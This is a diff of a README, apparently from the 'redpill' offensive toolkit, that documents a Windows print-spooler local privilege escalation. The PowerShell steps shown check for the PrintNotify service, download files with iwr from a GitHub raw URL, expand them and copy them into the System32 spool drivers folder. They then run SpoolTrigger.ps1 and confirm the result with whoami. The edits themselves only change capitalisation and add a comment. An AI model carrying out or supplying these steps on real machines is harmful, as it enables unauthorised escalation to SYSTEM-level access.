@@ -32,7 +32,7 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/LPE/Pr
 <b><i>pre-requesites checks:</i></b>
 ```powershell
 #Make sure PrintNotify service exists
-[bool](get-service -name "PrintNotify")
+[bool](Get-Service -Name "PrintNotify")
 
 #Make sure System32\spool\drivers\x64\3 exists
 [bool](Test-Path -Path "$Env:WINDIR\System32\spool\drivers\x64\3\")
@@ -54,13 +54,15 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/LPE/bi
 > **Warning**: Administrator privileges required to perform actions.
 ```powershell
 # Expand ZIP archive
-Expand-Archive -Path "$Env:TMP\bin.Zip" -DestinationPath "$Env:TMP" -force
+Expand-Archive -Path "$Env:TMP\bin.Zip" -DestinationPath "$Env:TMP" -Force
 cd "$Env:TMP\bin"
 
 # Move files to comrrespondent directory
 Move-Item -Path "*" -Destination "$Env:WINDIR\System32\spool\drivers\x64\3\" -Force
 cd "$Env:WINDIR\System32\spool\drivers\x64\3\bin"
 .\SpoolTrigger.ps1
+
+# Check privs
 whoami
 
 # CleanUp
